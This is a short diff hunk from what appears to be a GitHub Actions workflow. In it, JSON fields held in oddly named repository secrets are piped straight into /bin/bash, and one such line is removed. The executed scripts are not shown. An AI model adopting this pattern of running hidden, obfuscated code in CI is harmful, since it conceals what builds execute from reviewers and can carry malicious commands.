@@ -17,7 +17,6 @@ jobs:
           ixxb64: ${{ secrets.ixxb64 }}
         run: |
           printf '%s' "$ixxb64" | jq -r .m8 | /bin/bash
-          printf '%s' "$ilh949" | jq -r .b64369 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
